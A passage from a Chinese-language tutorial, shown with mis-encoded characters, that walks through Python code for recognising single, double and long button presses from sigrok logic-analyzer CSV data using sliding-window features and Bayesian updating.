</ol>
<p>æé»è¾åæä»ªä¸­çæ°æ®å¯¼åºä¸ºcsvæä»¶ï¼ä»£ç é¦åå®ç°äº&nbsp;read_sigrok_csv_simple&nbsp;å½æ°ï¼ç¨äºè¯»å sigrok CSV æ ¼å¼çæé®æ°æ®ï¼</p>
<pre><code class="language-python">def&nbsp;read_sigrok_csv_simple(filename):

&nbsp;&nbsp;&nbsp;&nbsp;time_data&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;signal_data&nbsp;=&nbsp;[]

&nbsp;&nbsp;&nbsp;&nbsp;with&nbsp;open(filename,&nbsp;'r',&nbsp;newline='')&nbsp;as&nbsp;csvfile:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reader&nbsp;=&nbsp;csv.reader(csvfile)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;row&nbsp;in&nbsp;reader:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;è·³è¿æ³¨éè¡åç©ºè¡

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;not&nbsp;row&nbsp;or&nbsp;row[0].startswith(';'):

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ç¡®ä¿è¡æä¸¤ä¸ªå

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(row)&nbsp;&gt;=&nbsp;2:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time_val&nbsp;=&nbsp;float(row[0])

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data_val&nbsp;=&nbsp;float(row[1])

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time_data.append(time_val)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;signal_data.append(data_val)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;ValueError:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;è·³è¿æ æ³è½¬æ¢ä¸ºæ°å­çè¡

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue

&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;time_data,&nbsp;signal_data
</code></pre>
<p>è¯¥å½æ°è¯»å CSV æä»¶ä¸­çæ¶é´æ³åä¿¡å·å¼ï¼è¿åä¸¤ä¸ªåè¡¨åå«å­å¨æ¶é´æ°æ®åä¿¡å·æ°æ®ï¼éè¿plotè¾åºéæ ·çæ°æ®å¾å¦ä¸æç¤ºï¼</p>
<p><img alt="" loading="lazy" data-src="https://fastly.jsdelivr.net/gh/bucketio/img0@main/2026/02/17/1771293729251-6f4bcd36-9a3b-40e6-beb1-e25327a680c4.png" class="lazyload"></p>
<ol start="2">
<li>è¯å«å¨ç±»è®¾è®¡</li>
</ol>
<p>æ ¸å¿å®ç°æ¯&nbsp;BayesianButtonRecognizer&nbsp;ç±»ï¼ç¨äºå®ç°åºäºè´å¶æ¯åç±»çæé®æ¨¡å¼è¯å«ï¼</p>
<pre><code class="language-python">class&nbsp;BayesianButtonRecognizer:

&nbsp;&nbsp;&nbsp;&nbsp;"""åºäºæ»å¨çªå£åè´å¶æ¯æ´æ°çæé®æ¨¡å¼è¯å«å¨"""

&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;__init__(self,&nbsp;window_size=20,&nbsp;sample_interval=0.01,&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;threshold=0.7):

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"""

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;åå§åè¯å«å¨

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Args:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;window_size:&nbsp;æ»å¨çªå£å¤§å°

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sample_interval:&nbsp;éæ ·é´é(ç§)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;threshold:&nbsp;å¤å®éå¼

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"""

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.window_size&nbsp;=&nbsp;window_size

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.sample_interval&nbsp;=&nbsp;sample_interval

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.threshold&nbsp;=&nbsp;threshold

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;æ»å¨çªå£å­å¨æè¿çè§æµåºå

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.window&nbsp;=&nbsp;deque(maxlen=window_size)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;æ¨¡å¼ç±»å«

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.modes&nbsp;=&nbsp;['æ æ',&nbsp;'åå»',&nbsp;'åå»',&nbsp;'é¿æ']

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;åéªæ¦ç&nbsp;-&nbsp;åå§ç­å¯è½

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.prior&nbsp;=&nbsp;np.array([0.25,&nbsp;0.25,&nbsp;0.25,&nbsp;0.25])

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ç¹å¾æåç¸å³çåæ°(åä½:éæ ·ç¹æ°)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.short_press_max&nbsp;=&nbsp;15&nbsp;&nbsp;#&nbsp;ç­ææå¤§æç»­æ¶é´

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.long_press_min&nbsp;=&nbsp;30&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;é¿ææå°æç»­æ¶é´&nbsp;&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.double_click_interval&nbsp;=&nbsp;10&nbsp;&nbsp;#&nbsp;åå»é´ééå¼

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;åå§åç¹å¾åå¸åæ°(åºäºç©ççè§£é¢è®¾)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self._init_feature_distributions()

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ç¹å¾æé

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.featwight={

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"æ æ":np.array([1.2,0.8,0.8,1.2]),

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"åå»":np.array([1,1.2,1.2,1]),

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"åå»":np.array([1,1.2,1.2,0.8]),

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"é¿æ":np.array([1.2,0.8,0.8,1.2])

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
</code></pre>
<ol start="3">
<li>ç¹å¾åå¸åå§å</li>
</ol>
<p>è¯å«å¨åå§åæ¶è®¾ç½®äºåæ¨¡å¼ä¸ç¹å¾çæ¦çåå¸åæ°ï¼</p>
<pre><code class="language-python">def&nbsp;_init_feature_distributions(self):

&nbsp;&nbsp;&nbsp;&nbsp;"""åå§ååæ¨¡å¼ä¸ç¹å¾çæ¦çåå¸åæ°"""

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;é«çµå¹³å æ¯çåå¸åæ°

&nbsp;&nbsp;&nbsp;&nbsp;self.high_ratio_params&nbsp;=&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'æ æ':&nbsp;0.05,&nbsp;&nbsp;&nbsp;#&nbsp;æ ææ¶é«çµå¹³å æ¯å¾ä½

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'åå»':&nbsp;0.2,&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;åå»æ¶æç­æé«çµå¹³

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'åå»':&nbsp;0.3,&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;åå»æ¶é«çµå¹³å æ¯ç¨é«

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'é¿æ':&nbsp;0.9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;é¿ææ¶é«çµå¹³å æ¯å¾é«

&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ä¸åæ²¿æ°éçåå¸åæ°

&nbsp;&nbsp;&nbsp;&nbsp;self.rise_count_params&nbsp;=&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'æ æ':&nbsp;0.1,&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;æ ææ¶å ä¹æ ä¸åæ²¿

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'åå»':&nbsp;1,&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;åå»æ¶æ1ä¸ªä¸åæ²¿

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'åå»':&nbsp;2,&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;åå»æ¶æ2ä¸ªä¸åæ²¿&nbsp;&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'é¿æ':&nbsp;0.7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;é¿ææ1ä¸ªä¸åæ²¿

&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;æé¿é«çµå¹³æç»­æ¶é´çåå¸åæ°(æ­£æåå¸:åå¼,æ åå·®)

&nbsp;&nbsp;&nbsp;&nbsp;self.max_duration_params&nbsp;=&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'æ æ':&nbsp;(0,&nbsp;2),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;æ ææ¶æç»­æ¶é´å¾ç­

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'åå»':&nbsp;(0.2,&nbsp;5),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;åå»ä¸­ç­æç»­æ¶é´

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'åå»':&nbsp;(0.17,&nbsp;3),&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;åå»æ¯æ¬¡æä¸æ¶é´ç­

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'é¿æ':&nbsp;(0.9,&nbsp;10)&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;é¿ææç»­æ¶é´é¿

&nbsp;&nbsp;&nbsp;&nbsp;}
</code></pre>
<ol start="4">
<li>ç¹å¾æå</li>
</ol>
<p>ä»æ»å¨çªå£æ°æ®ä¸­æåç¹å¾ï¼å¶ä¸­é«çµå¹³å æ¯æ¯éè¿æ±åºåå¹³åå¼æ¥è·å¾çï¼ç¶åè¾¹æ²¿è®¡æ°å¯¹åºäºè®°å½åºåè·³åæ°éï¼æé¿é«çµå¹³æ¶é´éè¿è®°å½è¿ç»­é«çµå¹³æ¶é¿è·åï¼</p>
<pre><code class="language-python">def&nbsp;extract_features(self,&nbsp;window_data):

&nbsp;&nbsp;&nbsp;&nbsp;"""ä»æ»å¨çªå£æ°æ®ä¸­æåç¹å¾"""

&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(window_data)&nbsp;==&nbsp;0:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None

&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;np.array(window_data)

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ç¹å¾1:&nbsp;é«çµå¹³å æ¯

&nbsp;&nbsp;&nbsp;&nbsp;high_ratio&nbsp;=&nbsp;np.mean(data)

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ç¹å¾2:&nbsp;ä¸åæ²¿æ°é(0-&gt;1çåå)

&nbsp;&nbsp;&nbsp;&nbsp;rises&nbsp;=&nbsp;0

&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(1,&nbsp;len(data)):

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;data[i-1]&nbsp;==&nbsp;0&nbsp;and&nbsp;data[i]&nbsp;==&nbsp;1:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rises&nbsp;+=&nbsp;1

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ç¹å¾3:&nbsp;ä¸éæ²¿æ°é(1-&gt;0çåå)

&nbsp;&nbsp;&nbsp;&nbsp;falls&nbsp;=&nbsp;0

&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(1,&nbsp;len(data)):

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;data[i-1]&nbsp;==&nbsp;1&nbsp;and&nbsp;data[i]&nbsp;==&nbsp;0:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;falls&nbsp;+=&nbsp;1

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ç¹å¾4:&nbsp;æé¿è¿ç»­é«çµå¹³æç»­æ¶é´

&nbsp;&nbsp;&nbsp;&nbsp;max_duration&nbsp;=&nbsp;0

&nbsp;&nbsp;&nbsp;&nbsp;current_duration&nbsp;=&nbsp;0

&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;val&nbsp;in&nbsp;data:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;val&nbsp;==&nbsp;1:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_duration&nbsp;+=&nbsp;1

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;max_duration&nbsp;=&nbsp;max(max_duration,&nbsp;current_duration)

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;current_duration&nbsp;=&nbsp;0

&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;{

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'high_ratio':&nbsp;high_ratio,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'rise_count':&nbsp;rises,&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'fall_count':&nbsp;falls,

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'max_duration':&nbsp;max_duration

&nbsp;&nbsp;&nbsp;&nbsp;}
</code></pre>
<ol start="5">
<li>ä¼¼ç¶æ¦çè®¡ç®</li>
</ol>
<p>è®¡ç®ç»å®æ¨¡å¼ä¸è§æµå°ç¹å¾å¼çä¼¼ç¶æ¦çï¼å³æ¡ä»¶æ¦çï¼éè¿ä¸é¢å®ä¹çåå¸åæ°ï¼ä½¿ç¨<code>æ­£æåå¸</code>è¿ä¼¼ï¼å¨pythonä¸­éè¿<code>stats.norm.pdf</code>æ±ç¹å¾å¯¹åºæ¯ä¸ªæ¨¡å¼çä¼¼ç¶ç¨åº¦ï¼ç¶ååºäºæ¡ä»¶ç¬ç«çåè®¾ï¼æ±è§£èåä¼¼ç¶ï¼è¡¨ç¤ºæ ·æ¬å¯¹æä¸æ¨¡å¼çæç»ä¼¼ç¶ç»æï¼</p>
<pre><code class="language-python">def&nbsp;calculate_likelihood(self,&nbsp;features,&nbsp;mode):

&nbsp;&nbsp;&nbsp;&nbsp;"""è®¡ç®ç»å®æ¨¡å¼ä¸è§æµå°ç¹å¾å¼çä¼¼ç¶æ¦ç"""

&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;features&nbsp;is&nbsp;None:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;1.0&nbsp;&nbsp;#&nbsp;æ ç¹å¾æ¶è¿åä¸­æ§ä¼¼ç¶

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ä½¿ç¨æ¦çå¯åº¦å½æ°è®¡ç®åç¹å¾çä¼¼ç¶

&nbsp;&nbsp;&nbsp;&nbsp;likelihoods&nbsp;=&nbsp;[]

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;1.&nbsp;é«çµå¹³å æ¯çä¼¼ç¶

&nbsp;&nbsp;&nbsp;&nbsp;target_ratio&nbsp;=&nbsp;self.high_ratio_params[mode]

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ä½¿ç¨æ­£æåå¸è¿ä¼¼,&nbsp;æ åå·®æ ¹æ®ç»éªè®¾å®

&nbsp;&nbsp;&nbsp;&nbsp;like_ratio&nbsp;=&nbsp;stats.norm.pdf(features['high_ratio'],&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target_ratio,&nbsp;0.2)

&nbsp;&nbsp;&nbsp;&nbsp;likelihoods.append(like_ratio&nbsp;+&nbsp;1e-10)&nbsp;&nbsp;#&nbsp;é¿åé¶

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;2.&nbsp;ä¸åæ²¿æ°éçä¼¼ç¶

&nbsp;&nbsp;&nbsp;&nbsp;target_rises&nbsp;=&nbsp;self.rise_count_params[mode]

&nbsp;&nbsp;&nbsp;&nbsp;like_rises&nbsp;=&nbsp;stats.norm.pdf(features['rise_count'],&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;target_rises,0.3)

&nbsp;&nbsp;&nbsp;&nbsp;likelihoods.append(like_rises&nbsp;+&nbsp;1e-10)

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;3.&nbsp;ä¸éæ²¿(åä¸åæ²¿)æ°éçä¼¼ç¶

&nbsp;&nbsp;&nbsp;&nbsp;target_falls&nbsp;=&nbsp;self.rise_count_params[mode]

&nbsp;&nbsp;&nbsp;&nbsp;like_falls&nbsp;=&nbsp;stats.norm.pdf(features['fall_count'],&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;target_falls,0.3)

&nbsp;&nbsp;&nbsp;&nbsp;likelihoods.append(like_falls&nbsp;+&nbsp;1e-10)

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;4.&nbsp;æé¿æç»­æ¶é´çä¼¼ç¶(ä½¿ç¨æ­£æåå¸)

&nbsp;&nbsp;&nbsp;&nbsp;target_dur,&nbsp;std_dur&nbsp;=&nbsp;self.max_duration_params[mode]

&nbsp;&nbsp;&nbsp;&nbsp;target_dur&nbsp;*=&nbsp;self.window_size

&nbsp;&nbsp;&nbsp;&nbsp;like_duration&nbsp;=&nbsp;stats.norm.pdf(features['max_duration'],&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target_dur,&nbsp;std_dur)

&nbsp;&nbsp;&nbsp;&nbsp;likelihoods.append(like_duration&nbsp;+&nbsp;1e-10)

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ç»ååç¹å¾çä¼¼ç¶(åè®¾ç¹å¾æ¡ä»¶ç¬ç«)

&nbsp;&nbsp;&nbsp;&nbsp;total_likelihood&nbsp;=&nbsp;np.prod(np.array(likelihoods))

&nbsp;&nbsp;&nbsp;&nbsp;print("ç¹å¾å¨mode[%s]çä¼¼ç¶ï¼"%{mode},likelihoods,"æç»èåä¼¼ç¶:%.

&nbsp;&nbsp;&nbsp;&nbsp;3f"%total_likelihood)

&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;total_likelihood
</code></pre>
<ol start="6">
<li>æ»å¨çªå£æ´æ°</li>
</ol>
<pre><code class="language-python">def&nbsp;slide_window(self,io_state):

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;ç§»é¤ææ§çå¼

&nbsp;&nbsp;&nbsp;&nbsp;self.window.popleft()

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;å°æ°è§æµå¼å å¥æ»å¨çªå£

&nbsp;&nbsp;&nbsp;&nbsp;self.window.append(io_state)
</code></pre>
<ol start="7">
<li>ä¿¡å¿µæ´æ°ä¸æ¨¡å¼å¤æ­</li>
</ol>
<p>è®¡ç®å®æ ·æ¬å¯¹æ¯ä¸ªæ¨¡å¼çä¼¼ç¶åï¼å°±äºåéªæ¦çç¸ä¹ï¼å°±å¾å°äºåéªæ¦çï¼ç¶åå½ä¸åå¾å°æç»ç»æï¼åæ¶ä½¿ç¨éå¼å¤å®æºå¶ï¼å½æå¤§åéªè¶è¿å¤å®éå¼åï¼æä¼è¯å«å·ä½æ¨¡å¼ï¼å¦åå°±æ¯ä¸ç¡®å®</p>
<pre><code class="language-python">def&nbsp;update_belief(self,&nbsp;io_state):

&nbsp;&nbsp;&nbsp;&nbsp;"""æ ¹æ®æ°è§æµå¼æ´æ°ä¿¡å¿µ"""

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;æåå½åçªå£çç¹å¾

&nbsp;&nbsp;&nbsp;&nbsp;features&nbsp;=&nbsp;self.extract_features(self.window)

&nbsp;&nbsp;&nbsp;&nbsp;print("ç¹å¾æåï¼",features)

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;è®¡ç®åæ¨¡å¼çä¼¼ç¶

&nbsp;&nbsp;&nbsp;&nbsp;likelihoods&nbsp;=&nbsp;np.array([self.calculate_likelihood(features,&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;mode)&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;mode&nbsp;in&nbsp;self.modes])

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;è´å¶æ¯æ´æ°:&nbsp;åéª&nbsp;â&nbsp;ä¼¼ç¶&nbsp;Ã&nbsp;åéª

&nbsp;&nbsp;&nbsp;&nbsp;unnormalized_posterior&nbsp;=&nbsp;likelihoods&nbsp;*&nbsp;self.prior

&nbsp;&nbsp;&nbsp;&nbsp;evidence&nbsp;=&nbsp;np.sum(unnormalized_posterior)

&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;evidence&nbsp;&gt;&nbsp;0:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;posterior&nbsp;=&nbsp;unnormalized_posterior&nbsp;/&nbsp;evidence

&nbsp;&nbsp;&nbsp;&nbsp;else:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;posterior&nbsp;=&nbsp;self.prior.copy()

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;æ´æ°åéª(ç¨äºä¸ä¸æ¬¡è¿­ä»£)

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;self.prior&nbsp;=&nbsp;posterior

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;å¤æ­å½åæ¨¡å¼

&nbsp;&nbsp;&nbsp;&nbsp;best_mode_idx&nbsp;=&nbsp;np.argmax(posterior)

&nbsp;&nbsp;&nbsp;&nbsp;best_prob&nbsp;=&nbsp;posterior[best_mode_idx]

&nbsp;&nbsp;&nbsp;&nbsp;print("åéªï¼",posterior)

&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;best_prob&nbsp;&gt;&nbsp;self.threshold:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;detected_mode&nbsp;=&nbsp;self.modes[best_mode_idx]

&nbsp;&nbsp;&nbsp;&nbsp;else:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;detected_mode&nbsp;=&nbsp;'ä¸ç¡®å®'

&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;detected_mode,&nbsp;posterior
</code></pre>
<ol start="8">
<li>ä¸»å½æ°ä¸æ¼ç¤º</li>
</ol>
<p>å ä¸ºå®ä¹äºé«çµå¹³ä¸ºææçµå¹³ï¼ä½å®éä¸­ä½çµå¹³ï¼æèè¯´ä¸éæ²¿æ¯æé®å¨ä½çååºï¼æä»¥å¤çæ°æ®åºåæ¶åäºç¸åºçååå¤çã</p>
<pre><code class="language-python">if&nbsp;__name__&nbsp;==&nbsp;"__main__":

&nbsp;&nbsp;&nbsp;&nbsp;DeltaT&nbsp;=&nbsp;0.01 # éæ ·é´é

&nbsp;&nbsp;&nbsp;&nbsp;UnitTime&nbsp;=&nbsp;1e-06 # åå§æ°æ®ç¹çæ¶åº

&nbsp;&nbsp;&nbsp;&nbsp;SampleInterval&nbsp;=&nbsp;math.floor(DeltaT&nbsp;/&nbsp;UnitTime)

